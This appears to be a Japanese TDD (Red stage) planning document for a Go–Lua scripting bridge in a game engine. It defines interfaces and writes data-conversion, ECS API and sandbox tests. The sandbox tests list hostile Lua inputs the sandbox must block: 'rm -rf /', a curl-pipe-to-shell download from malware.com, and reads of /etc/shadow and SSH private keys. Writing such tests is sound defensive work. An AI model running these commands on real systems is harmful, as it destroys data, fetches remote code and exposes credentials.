# TASK-303: Lua Bridge実装 - テスト実装 (Red段階)

## Red段階の目標

**TDD Red段階の目的**: 実装前に失敗するテストを作成し、要求仕様を明確化する  
**実装方針**: インターフェース定義 → 失敗テスト作成 → コンパイルエラー解決  
**テストファースト**: 実装前にテストが失敗することを確認する

## Phase 1: 基本インターフェース・データ変換テスト実装

### インターフェース定義ファイル作成

まず、Lua Bridgeの基本インターフェースを定義します。

#### `internal/core/ecs/lua/interfaces.go`
```go
package lua

import (
    "time"
    
    "github.com/yuin/gopher-lua"
)

// LuaBridge - メインのLua統合インターフェース
type LuaBridge interface {
    // Lua VM管理
    CreateVM(config *LuaVMConfig) (*LuaVM, error)
    DestroyVM(vm *LuaVM) error
    
    // スクリプト実行
    LoadScript(vm *LuaVM, scriptPath string) (*LuaScript, error)
    UnloadScript(vm *LuaVM, script *LuaScript) error
    ExecuteScript(vm *LuaVM, script *LuaScript) error
    
    // データ変換
    GoToLua(vm *LuaVM, value interface{}) (lua.LValue, error)
    LuaToGo(vm *LuaVM, value lua.LValue, target interface{}) error
    
    // API登録
    RegisterECSAPI(vm *LuaVM, ecsAPI *ModECSAPI) error
    SetPermissions(vm *LuaVM, permissions *APIPermissions) error
}

// LuaVM - Lua仮想マシンラッパー
type LuaVM struct {
    state        *lua.LState
    sandbox      *Sandbox
    permissions  *APIPermissions
    resources    *ResourceLimits
    errorHandler ErrorHandler
}

// LuaVMConfig - Lua VM設定
type LuaVMConfig struct {
    SandboxEnabled bool
    ResourceLimits *ResourceLimits
    Permissions    *APIPermissions
}

// LuaScript - Luaスクリプト管理
type LuaScript struct {
    path       string
    content    []byte
    loaded     bool
    metadata   *ScriptMetadata
}

// APIPermissions - API権限管理
type APIPermissions struct {
    AllowedAPIs    []string
    ForbiddenAPIs  []string
    ResourceLimits *ResourceLimits
}

// ResourceLimits - リソース制限
type ResourceLimits struct {
    MaxExecutionTime time.Duration // デフォルト: 100ms
    MaxMemoryUsage   int64         // デフォルト: 10MB
    MaxFileAccess    bool          // デフォルト: false
    MaxNetworkAccess bool          // デフォルト: false
}

// Sandbox - サンドボックス制御
type Sandbox struct {
    FileSystemRestricted bool
    NetworkRestricted    bool
    OSCommandsBlocked    bool
}

// ScriptMetadata - スクリプトメタデータ
type ScriptMetadata struct {
    Name         string            `json:"name"`
    Version      string            `json:"version"`
    Author       string            `json:"author"`
    Description  string            `json:"description"`
    Dependencies []string          `json:"dependencies"`
    Permissions  []string          `json:"permissions"`
    APIVersion   string            `json:"api_version"`
    EntryPoint   string            `json:"entry_point"`
}

// ModECSAPI - MOD向けECS API制限インターフェース
type ModECSAPI interface {
    // EntityManager操作（制限版）
    CreateEntity() (EntityID, error)
    DestroyEntity(id EntityID) error
    EntityExists(id EntityID) bool
    
    // ComponentStore操作（制限版）
    AddComponent(entityID EntityID, componentType string, data interface{}) error
    RemoveComponent(entityID EntityID, componentType string) error
    GetComponent(entityID EntityID, componentType string) (interface{}, error)
    HasComponent(entityID EntityID, componentType string) bool
    
    // Query操作（制限版）
    QueryEntities() QueryBuilder
    
    // Event操作（制限版）
    FireEvent(eventType string, data interface{}) error
    SubscribeEvent(eventType string, callback func(interface{})) error
}

// EntityID - エンティティID型定義
type EntityID uint64

// QueryBuilder - クエリビルダーインターフェース
type QueryBuilder interface {
    With(componentType string) QueryBuilder
    Without(componentType string) QueryBuilder
    Execute() ([]EntityID, error)
}

// ErrorHandler - エラーハンドラー関数型
type ErrorHandler func(error) error
```

### 基本テストファイル作成

#### `internal/core/ecs/lua/lua_bridge_test.go`
```go
package lua

import (
    "testing"
    "time"
    
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
    lua "github.com/yuin/gopher-lua"
)

// TestLuaBridge_CreateDestroyVM - VM作成・削除の基本テスト
func TestLuaBridge_CreateDestroyVM(t *testing.T) {
    bridge := NewLuaBridge()
    
    config := &LuaVMConfig{
        SandboxEnabled: true,
        ResourceLimits: &ResourceLimits{
            MaxExecutionTime: 100 * time.Millisecond,
            MaxMemoryUsage:   10 * 1024 * 1024, // 10MB
        },
    }
    
    // VM作成テスト
    vm, err := bridge.CreateVM(config)
    require.NoError(t, err, "VM creation should succeed")
    require.NotNil(t, vm, "Created VM should not be nil")
    require.NotNil(t, vm.state, "VM state should not be nil")
    
    // VM削除テスト
    err = bridge.DestroyVM(vm)
    require.NoError(t, err, "VM destruction should succeed")
}

// TestDataConversion_GoToLua_BasicTypes - 基本型変換テスト
func TestDataConversion_GoToLua_BasicTypes(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    testCases := []struct {
        name     string
        input    interface{}
        expected lua.LValueType
        value    interface{}
    }{
        {"string", "hello world", lua.LTString, "hello world"},
        {"int", 42, lua.LTNumber, float64(42)},
        {"float64", 3.14159, lua.LTNumber, 3.14159},
        {"bool_true", true, lua.LTBool, true},
        {"bool_false", false, lua.LTBool, false},
        {"empty_string", "", lua.LTString, ""},
        {"zero_int", 0, lua.LTNumber, float64(0)},
        {"negative_int", -100, lua.LTNumber, float64(-100)},
    }
    
    for _, tc := range testCases {
        t.Run(tc.name, func(t *testing.T) {
            // GoからLuaに変換
            luaVal, err := bridge.GoToLua(vm, tc.input)
            require.NoError(t, err, "GoToLua conversion should succeed for %s", tc.name)
            assert.Equal(t, tc.expected, luaVal.Type(), "Lua type should match expected")
            
            // 値の検証
            switch tc.expected {
            case lua.LTString:
                assert.Equal(t, tc.value, luaVal.String())
            case lua.LTNumber:
                assert.Equal(t, tc.value, float64(lua.LVAsNumber(luaVal)))
            case lua.LTBool:
                assert.Equal(t, tc.value, lua.LVAsBool(luaVal))
            }
        })
    }
}

// TestDataConversion_LuaToGo_BasicTypes - Lua→Go基本型変換テスト
func TestDataConversion_LuaToGo_BasicTypes(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    testCases := []struct {
        name      string
        luaValue  lua.LValue
        targetPtr interface{}
        expected  interface{}
    }{
        {"string", lua.LString("test string"), new(string), "test string"},
        {"int", lua.LNumber(123), new(int), 123},
        {"float64", lua.LNumber(2.71828), new(float64), 2.71828},
        {"bool_true", lua.LTrue, new(bool), true},
        {"bool_false", lua.LFalse, new(bool), false},
    }
    
    for _, tc := range testCases {
        t.Run(tc.name, func(t *testing.T) {
            err := bridge.LuaToGo(vm, tc.luaValue, tc.targetPtr)
            require.NoError(t, err, "LuaToGo conversion should succeed for %s", tc.name)
            
            // 値の検証（ポインタから値を取得）
            switch ptr := tc.targetPtr.(type) {
            case *string:
                assert.Equal(t, tc.expected, *ptr)
            case *int:
                assert.Equal(t, tc.expected, *ptr)
            case *float64:
                assert.Equal(t, tc.expected, *ptr)
            case *bool:
                assert.Equal(t, tc.expected, *ptr)
            }
        })
    }
}

// TestDataConversion_GoSliceToLuaTable - Goスライス→Luaテーブル変換テスト
func TestDataConversion_GoSliceToLuaTable(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    testSlice := []string{"apple", "banana", "cherry"}
    
    luaVal, err := bridge.GoToLua(vm, testSlice)
    require.NoError(t, err, "Slice conversion should succeed")
    require.Equal(t, lua.LTTable, luaVal.Type(), "Result should be Lua table")
    
    luaTable := luaVal.(*lua.LTable)
    
    // Luaテーブルは1-indexedなので注意
    assert.Equal(t, "apple", luaTable.RawGetInt(1).String())
    assert.Equal(t, "banana", luaTable.RawGetInt(2).String())
    assert.Equal(t, "cherry", luaTable.RawGetInt(3).String())
    assert.Equal(t, 3, luaTable.Len())
}

// TestDataConversion_LuaTableToGoSlice - Luaテーブル→Goスライス変換テスト
func TestDataConversion_LuaTableToGoSlice(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    // Luaテーブル作成
    luaTable := vm.state.NewTable()
    luaTable.RawSetInt(1, lua.LString("first"))
    luaTable.RawSetInt(2, lua.LString("second"))
    luaTable.RawSetInt(3, lua.LString("third"))
    
    var result []string
    err := bridge.LuaToGo(vm, luaTable, &result)
    require.NoError(t, err, "Table to slice conversion should succeed")
    
    expected := []string{"first", "second", "third"}
    assert.Equal(t, expected, result)
}

// TestDataConversion_GoMapToLuaTable - Goマップ→Luaテーブル変換テスト
func TestDataConversion_GoMapToLuaTable(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    testMap := map[string]interface{}{
        "name":   "Player1",
        "level":  42,
        "health": 100.5,
        "alive":  true,
    }
    
    luaVal, err := bridge.GoToLua(vm, testMap)
    require.NoError(t, err, "Map conversion should succeed")
    require.Equal(t, lua.LTTable, luaVal.Type(), "Result should be Lua table")
    
    luaTable := luaVal.(*lua.LTable)
    
    assert.Equal(t, "Player1", luaTable.RawGetString("name").String())
    assert.Equal(t, float64(42), float64(lua.LVAsNumber(luaTable.RawGetString("level"))))
    assert.Equal(t, 100.5, float64(lua.LVAsNumber(luaTable.RawGetString("health"))))
    assert.Equal(t, true, lua.LVAsBool(luaTable.RawGetString("alive")))
}

// TestDataConversion_GoStructToLuaTable - Go構造体→Luaテーブル変換テスト
func TestDataConversion_GoStructToLuaTable(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    type TestStruct struct {
        Name   string  `json:"name"`
        Age    int     `json:"age"`
        Score  float64 `json:"score"`
        Active bool    `json:"active"`
    }
    
    testStruct := TestStruct{
        Name:   "TestPlayer",
        Age:    25,
        Score:  88.5,
        Active: true,
    }
    
    luaVal, err := bridge.GoToLua(vm, testStruct)
    require.NoError(t, err, "Struct conversion should succeed")
    require.Equal(t, lua.LTTable, luaVal.Type(), "Result should be Lua table")
    
    luaTable := luaVal.(*lua.LTable)
    
    assert.Equal(t, "TestPlayer", luaTable.RawGetString("name").String())
    assert.Equal(t, float64(25), float64(lua.LVAsNumber(luaTable.RawGetString("age"))))
    assert.Equal(t, 88.5, float64(lua.LVAsNumber(luaTable.RawGetString("score"))))
    assert.Equal(t, true, lua.LVAsBool(luaTable.RawGetString("active")))
}

// TestDataConversion_TypeError - 型不一致エラーテスト
func TestDataConversion_TypeError(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    // nil値変換試行
    _, err := bridge.GoToLua(vm, nil)
    require.Error(t, err, "nil conversion should fail")
    assert.Contains(t, err.Error(), "unsupported type")
    
    // 未対応型変換試行
    unsupportedValue := make(chan int) // channel型は未対応
    _, err = bridge.GoToLua(vm, unsupportedValue)
    require.Error(t, err, "Unsupported type conversion should fail")
    assert.Contains(t, err.Error(), "unsupported type")
    
    // 型不一致でのLuaToGo変換
    luaNumber := lua.LNumber(42)
    var stringTarget string
    err = bridge.LuaToGo(vm, luaNumber, &stringTarget)
    require.Error(t, err, "Type mismatch conversion should fail")
}

// BenchmarkGoToLua_String - データ変換パフォーマンステスト
func BenchmarkGoToLua_String(b *testing.B) {
    bridge := NewLuaBridge()
    vm := setupTestVMForBench(b, bridge)
    defer bridge.DestroyVM(vm)
    
    testString := "benchmark test string"
    
    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        _, err := bridge.GoToLua(vm, testString)
        if err != nil {
            b.Fatal(err)
        }
    }
}

// BenchmarkLuaToGo_String - Lua→Go変換パフォーマンステスト
func BenchmarkLuaToGo_String(b *testing.B) {
    bridge := NewLuaBridge()
    vm := setupTestVMForBench(b, bridge)
    defer bridge.DestroyVM(vm)
    
    luaString := lua.LString("benchmark test string")
    
    b.ResetTimer()
    for i := 0; i < b.N; i++ {
        var result string
        err := bridge.LuaToGo(vm, luaString, &result)
        if err != nil {
            b.Fatal(err)
        }
    }
}

// ========== ヘルパー関数 ==========

// setupTestVM - テスト用VM作成ヘルパー
func setupTestVM(t *testing.T, bridge LuaBridge) *LuaVM {
    config := &LuaVMConfig{
        SandboxEnabled: false, // テスト用は無効
        ResourceLimits: &ResourceLimits{
            MaxExecutionTime: 1 * time.Second,
            MaxMemoryUsage:   50 * 1024 * 1024, // 50MB
        },
    }
    
    vm, err := bridge.CreateVM(config)
    require.NoError(t, err)
    return vm
}

// setupTestVMForBench - ベンチマーク用VM作成ヘルパー
func setupTestVMForBench(b *testing.B, bridge LuaBridge) *LuaVM {
    config := &LuaVMConfig{
        SandboxEnabled: false,
        ResourceLimits: &ResourceLimits{
            MaxExecutionTime: 10 * time.Second,
            MaxMemoryUsage:   100 * 1024 * 1024, // 100MB
        },
    }
    
    vm, err := bridge.CreateVM(config)
    if err != nil {
        b.Fatal(err)
    }
    return vm
}
```

### ECS API Wrapper テスト実装

#### `internal/core/ecs/lua/ecs_api_test.go`
```go
package lua

import (
    "testing"
    
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
    lua "github.com/yuin/gopher-lua"
)

// TestLuaAPI_EntityManager - EntityManager Lua APIテスト
func TestLuaAPI_EntityManager(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    // Mock ECS APIを登録
    mockAPI := NewMockECSAPI()
    err := bridge.RegisterECSAPI(vm, mockAPI)
    require.NoError(t, err, "ECS API registration should succeed")
    
    // ecs.create_entity() テスト
    luaCode := `
        local entity = ecs.create_entity()
        assert(entity ~= nil, "Created entity should not be nil")
        assert(type(entity) == "number", "Entity ID should be number")
        return entity
    `
    
    err = vm.state.DoString(luaCode)
    require.NoError(t, err, "Lua entity creation should succeed")
    
    result := vm.state.Get(-1)
    assert.Equal(t, lua.LTNumber, result.Type())
    entityID := EntityID(lua.LVAsNumber(result))
    assert.True(t, entityID > 0, "Entity ID should be positive")
    
    // ecs.entity_exists() テスト
    existsCode := `
        local exists = ecs.entity_exists(` + lua.LVAsString(result) + `)
        assert(exists == true, "Created entity should exist")
        return exists
    `
    
    err = vm.state.DoString(existsCode)
    require.NoError(t, err, "Entity existence check should succeed")
    
    existsResult := vm.state.Get(-1)
    assert.Equal(t, true, lua.LVAsBool(existsResult))
}

// TestLuaAPI_ComponentStore - ComponentStore Lua APIテスト
func TestLuaAPI_ComponentStore(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    mockAPI := NewMockECSAPI()
    err := bridge.RegisterECSAPI(vm, mockAPI)
    require.NoError(t, err)
    
    // コンポーネント追加・取得・削除のテスト
    componentCode := `
        local entity = ecs.create_entity()
        
        -- Transform コンポーネント追加
        local success = ecs.add_component(entity, "Transform", {
            x = 10.5,
            y = 20.5,
            z = 0.0
        })
        assert(success == true, "Component addition should succeed")
        
        -- コンポーネント存在確認
        local has = ecs.has_component(entity, "Transform")
        assert(has == true, "Entity should have Transform component")
        
        -- コンポーネント取得
        local transform = ecs.get_component(entity, "Transform")
        assert(transform ~= nil, "Component should be retrievable")
        assert(transform.x == 10.5, "Component data should match")
        assert(transform.y == 20.5, "Component data should match")
        assert(transform.z == 0.0, "Component data should match")
        
        -- コンポーネント削除
        local removed = ecs.remove_component(entity, "Transform")
        assert(removed == true, "Component removal should succeed")
        
        -- 削除後の存在確認
        local has_after = ecs.has_component(entity, "Transform")
        assert(has_after == false, "Entity should not have component after removal")
        
        return {entity = entity, success = success}
    `
    
    err = vm.state.DoString(componentCode)
    require.NoError(t, err, "Component operations should succeed")
    
    result := vm.state.Get(-1)
    assert.Equal(t, lua.LTTable, result.Type())
}

// TestLuaAPI_QueryEngine - Query Engine Lua APIテスト
func TestLuaAPI_QueryEngine(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    mockAPI := NewMockECSAPI()
    err := bridge.RegisterECSAPI(vm, mockAPI)
    require.NoError(t, err)
    
    queryCode := `
        -- テストエンティティ作成
        local entity1 = ecs.create_entity()
        ecs.add_component(entity1, "Transform", {x=10, y=10, z=0})
        ecs.add_component(entity1, "Sprite", {texture="player.png"})
        
        local entity2 = ecs.create_entity()
        ecs.add_component(entity2, "Transform", {x=20, y=20, z=0})
        
        -- Transform を持つエンティティをクエリ
        local entities = ecs.query()
            :with("Transform")
            :execute()
            
        assert(#entities >= 2, "Should find at least 2 entities")
        
        -- Transform AND Sprite を持つエンティティをクエリ
        local sprite_entities = ecs.query()
            :with("Transform")
            :with("Sprite")
            :execute()
            
        assert(#sprite_entities >= 1, "Should find at least 1 entity with both components")
        
        return {
            all_transform = #entities,
            with_sprite = #sprite_entities
        }
    `
    
    err = vm.state.DoString(queryCode)
    require.NoError(t, err, "Query operations should succeed")
    
    result := vm.state.Get(-1)
    assert.Equal(t, lua.LTTable, result.Type())
}

// TestLuaAPI_APIPermissions - API権限制御テスト
func TestLuaAPI_APIPermissions(t *testing.T) {
    bridge := NewLuaBridge()
    
    // 制限された権限でVMを作成
    restrictedConfig := &LuaVMConfig{
        SandboxEnabled: true,
        Permissions: &APIPermissions{
            AllowedAPIs:   []string{"create_entity", "entity_exists"},
            ForbiddenAPIs: []string{"add_component", "remove_component"},
        },
    }
    
    vm, err := bridge.CreateVM(restrictedConfig)
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    mockAPI := NewMockECSAPI()
    err = bridge.RegisterECSAPI(vm, mockAPI)
    require.NoError(t, err)
    
    err = bridge.SetPermissions(vm, restrictedConfig.Permissions)
    require.NoError(t, err)
    
    // 許可されたAPI呼び出しテスト
    allowedCode := `
        local entity = ecs.create_entity()  -- 許可
        assert(entity ~= nil)
        
        local exists = ecs.entity_exists(entity)  -- 許可
        assert(exists == true)
        
        return entity
    `
    
    err = vm.state.DoString(allowedCode)
    require.NoError(t, err, "Allowed API calls should succeed")
    
    // 禁止されたAPI呼び出しテスト
    forbiddenCode := `
        local entity = ecs.create_entity()
        ecs.add_component(entity, "Transform", {})  -- 禁止、エラーになるべき
    `
    
    err = vm.state.DoString(forbiddenCode)
    require.Error(t, err, "Forbidden API calls should fail")
    assert.Contains(t, err.Error(), "permission denied")
}

// TestLuaAPI_EventSystem - Event System Lua APIテスト  
func TestLuaAPI_EventSystem(t *testing.T) {
    bridge := NewLuaBridge()
    vm := setupTestVM(t, bridge)
    defer bridge.DestroyVM(vm)
    
    mockAPI := NewMockECSAPI()
    err := bridge.RegisterECSAPI(vm, mockAPI)
    require.NoError(t, err)
    
    eventCode := `
        local event_received = false
        local event_data = nil
        
        -- イベント購読
        ecs.subscribe("TestEvent", function(data)
            event_received = true
            event_data = data
        end)
        
        -- イベント発火
        ecs.fire_event("TestEvent", {message = "Hello World", value = 42})
        
        -- 少し待つ（非同期処理のため）
        -- 実際の実装では適切な同期メカニズムを使用
        
        return {
            received = event_received,
            data = event_data
        }
    `
    
    err = vm.state.DoString(eventCode)
    require.NoError(t, err, "Event operations should succeed")
    
    result := vm.state.Get(-1)
    assert.Equal(t, lua.LTTable, result.Type())
}

// ========== Mock ECS API ==========

// MockECSAPI - テスト用のMock ECS API実装
type MockECSAPI struct {
    entities   map[EntityID]bool
    components map[EntityID]map[string]interface{}
    nextID     EntityID
}

// NewMockECSAPI - Mock ECS API作成
func NewMockECSAPI() *MockECSAPI {
    return &MockECSAPI{
        entities:   make(map[EntityID]bool),
        components: make(map[EntityID]map[string]interface{}),
        nextID:     1,
    }
}

func (m *MockECSAPI) CreateEntity() (EntityID, error) {
    id := m.nextID
    m.nextID++
    m.entities[id] = true
    m.components[id] = make(map[string]interface{})
    return id, nil
}

func (m *MockECSAPI) DestroyEntity(id EntityID) error {
    delete(m.entities, id)
    delete(m.components, id)
    return nil
}

func (m *MockECSAPI) EntityExists(id EntityID) bool {
    return m.entities[id]
}

func (m *MockECSAPI) AddComponent(entityID EntityID, componentType string, data interface{}) error {
    if !m.entities[entityID] {
        return assert.AnError
    }
    m.components[entityID][componentType] = data
    return nil
}

func (m *MockECSAPI) RemoveComponent(entityID EntityID, componentType string) error {
    if !m.entities[entityID] {
        return assert.AnError
    }
    delete(m.components[entityID], componentType)
    return nil
}

func (m *MockECSAPI) GetComponent(entityID EntityID, componentType string) (interface{}, error) {
    if !m.entities[entityID] {
        return nil, assert.AnError
    }
    return m.components[entityID][componentType], nil
}

func (m *MockECSAPI) HasComponent(entityID EntityID, componentType string) bool {
    if !m.entities[entityID] {
        return false
    }
    _, exists := m.components[entityID][componentType]
    return exists
}

func (m *MockECSAPI) QueryEntities() QueryBuilder {
    return NewMockQueryBuilder(m)
}

func (m *MockECSAPI) FireEvent(eventType string, data interface{}) error {
    // Mock implementation - 実際には何もしない
    return nil
}

func (m *MockECSAPI) SubscribeEvent(eventType string, callback func(interface{})) error {
    // Mock implementation - 実際には何もしない
    return nil
}

// MockQueryBuilder - Mock Query Builder実装
type MockQueryBuilder struct {
    api        *MockECSAPI
    withTypes  []string
    withoutTypes []string
}

func NewMockQueryBuilder(api *MockECSAPI) *MockQueryBuilder {
    return &MockQueryBuilder{api: api}
}

func (m *MockQueryBuilder) With(componentType string) QueryBuilder {
    m.withTypes = append(m.withTypes, componentType)
    return m
}

func (m *MockQueryBuilder) Without(componentType string) QueryBuilder {
    m.withoutTypes = append(m.withoutTypes, componentType)
    return m
}

func (m *MockQueryBuilder) Execute() ([]EntityID, error) {
    var results []EntityID
    
    for entityID := range m.api.entities {
        matches := true
        
        // WITH条件チェック
        for _, componentType := range m.withTypes {
            if !m.api.HasComponent(entityID, componentType) {
                matches = false
                break
            }
        }
        
        // WITHOUT条件チェック
        if matches {
            for _, componentType := range m.withoutTypes {
                if m.api.HasComponent(entityID, componentType) {
                    matches = false
                    break
                }
            }
        }
        
        if matches {
            results = append(results, entityID)
        }
    }
    
    return results, nil
}
```

### サンドボックス・セキュリティテスト実装

#### `internal/core/ecs/lua/sandbox_test.go`
```go
package lua

import (
    "testing"
    "time"
    
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
)

// TestSandbox_FileAccessRestriction - ファイルアクセス制限テスト
func TestSandbox_FileAccessRestriction(t *testing.T) {
    bridge := NewLuaBridge()
    
    sandboxConfig := &LuaVMConfig{
        SandboxEnabled: true,
        ResourceLimits: &ResourceLimits{
            MaxFileAccess: false, // ファイルアクセス禁止
        },
    }
    
    vm, err := bridge.CreateVM(sandboxConfig)
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    attackCodes := []string{
        `local file = io.open("/etc/passwd", "r")`,
        `local content = io.input("/home/user/.ssh/id_rsa"):read("*all")`,
        `dofile("/etc/shadow")`,
        `loadfile("../../../config/secret.yaml")()`,
    }
    
    for i, attackCode := range attackCodes {
        t.Run(fmt.Sprintf("FileAttack_%d", i), func(t *testing.T) {
            err := vm.state.DoString(attackCode)
            require.Error(t, err, "File access attack should be blocked: %s", attackCode)
            assert.Contains(t, err.Error(), "not available", "Should indicate function is not available")
        })
    }
}

// TestSandbox_OSCommandBlocking - システムコマンド実行ブロックテスト
func TestSandbox_OSCommandBlocking(t *testing.T) {
    bridge := NewLuaBridge()
    
    sandboxConfig := &LuaVMConfig{
        SandboxEnabled: true,
        ResourceLimits: &ResourceLimits{
            MaxFileAccess:    false,
            MaxNetworkAccess: false,
        },
    }
    
    vm, err := bridge.CreateVM(sandboxConfig)
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    attackCodes := []string{
        `os.execute("rm -rf /")`,
        `os.execute("curl malware.com/download | sh")`,
        `os.execute("cat /etc/passwd")`,
        `local p = io.popen("ls -la /")`,
        `io.popen("whoami"):read()`,
    }
    
    for i, attackCode := range attackCodes {
        t.Run(fmt.Sprintf("OSAttack_%d", i), func(t *testing.T) {
            err := vm.state.DoString(attackCode)
            require.Error(t, err, "OS command attack should be blocked: %s", attackCode)
        })
    }
}

// TestSandbox_MemoryBombDefense - メモリボム攻撃防御テスト
func TestSandbox_MemoryBombDefense(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping memory bomb test in short mode")
    }
    
    bridge := NewLuaBridge()
    
    restrictiveConfig := &LuaVMConfig{
        SandboxEnabled: true,
        ResourceLimits: &ResourceLimits{
            MaxMemoryUsage:   5 * 1024 * 1024, // 5MB制限
            MaxExecutionTime: 500 * time.Millisecond,
        },
    }
    
    vm, err := bridge.CreateVM(restrictiveConfig)
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    memoryBombCode := `
        local huge_table = {}
        for i=1,1000000 do 
            huge_table[i] = string.rep("x", 10000)  -- 10MB+ allocation attempt
        end
    `
    
    err = vm.state.DoString(memoryBombCode)
    require.Error(t, err, "Memory bomb should be prevented")
    assert.Contains(t, err.Error(), "memory")
}

// TestSandbox_InfiniteLoopDefense - 無限ループ攻撃防御テスト  
func TestSandbox_InfiniteLoopDefense(t *testing.T) {
    bridge := NewLuaBridge()
    
    restrictiveConfig := &LuaVMConfig{
        SandboxEnabled: true,
        ResourceLimits: &ResourceLimits{
            MaxExecutionTime: 100 * time.Millisecond,
            MaxMemoryUsage:   10 * 1024 * 1024,
        },
    }
    
    vm, err := bridge.CreateVM(restrictiveConfig)
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    infiniteLoopCode := `
        while true do
            -- infinite loop attack
        end
    `
    
    start := time.Now()
    err = vm.state.DoString(infiniteLoopCode)
    elapsed := time.Since(start)
    
    require.Error(t, err, "Infinite loop should be terminated")
    assert.Less(t, elapsed, 200*time.Millisecond, "Should terminate quickly")
    assert.Contains(t, err.Error(), "timeout")
}

// TestSandbox_NetworkAccessBlocking - ネットワークアクセスブロックテスト
func TestSandbox_NetworkAccessBlocking(t *testing.T) {
    bridge := NewLuaBridge()
    
    sandboxConfig := &LuaVMConfig{
        SandboxEnabled: true,
        ResourceLimits: &ResourceLimits{
            MaxNetworkAccess: false, // ネットワークアクセス禁止
        },
    }
    
    vm, err := bridge.CreateVM(sandboxConfig)
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    networkCodes := []string{
        `require("socket")`,
        `require("http")`,
        `require("net")`,
    }
    
    for i, code := range networkCodes {
        t.Run(fmt.Sprintf("NetworkAttack_%d", i), func(t *testing.T) {
            err := vm.state.DoString(code)
            require.Error(t, err, "Network access should be blocked: %s", code)
            assert.Contains(t, err.Error(), "not found")
        })
    }
}

// TestSandbox_DangerousLibraryBlocking - 危険なライブラリブロックテスト
func TestSandbox_DangerousLibraryBlocking(t *testing.T) {
    bridge := NewLuaBridge()
    
    sandboxConfig := &LuaVMConfig{
        SandboxEnabled: true,
    }
    
    vm, err := bridge.CreateVM(sandboxConfig)
    require.NoError(t, err)
    defer bridge.DestroyVM(vm)
    
    dangerousCodes := []string{
        `debug.getlocal()`,      // debug library
        `os.getenv("PATH")`,     // 環境変数アクセス
        `package.loadlib()`,     // 外部ライブラリローディング  
    }
    
    for i, code := range dangerousCodes {
        t.Run(fmt.Sprintf("DangerousLib_%d", i), func(t *testing.T) {
            err := vm.state.DoString(code)
            require.Error(t, err, "Dangerous library access should be blocked: %s", code)
        })
    }
}
```

## Red段階テスト実行確認

上記のテストコードは現時点では**実装が存在しないため全て失敗する**ことが期待されます。これがTDDのRed段階の目的です。

### 予想される失敗パターン

1. **コンパイルエラー**: `NewLuaBridge()`関数が存在しない
2. **インターフェース未実装エラー**: LuaBridge実装が存在しない  
3. **メソッド未実装エラー**: 各種メソッドの実装が存在しない
4. **型定義不足**: 必要な型・構造体の定義が不足

これらのエラーは次のGreen段階で解決していきます。

## 次のステップ

Red段階完了後、次は**Green段階**に進み：

1. **最小限の実装**でテストを通すコードを作成
2. **インターフェース実装**でコンパイルエラーを解決  
3. **基本機能実装**でテストを段階的に通す
4. **段階的機能追加**で全テスト通過を目指す

この段階では**過度な実装を避け**、テストが通る最小限のコードのみを実装することが重要です。

---

**Red段階完了**: 失敗するテストの実装が完了しました。次にGreen段階で最小実装を行います。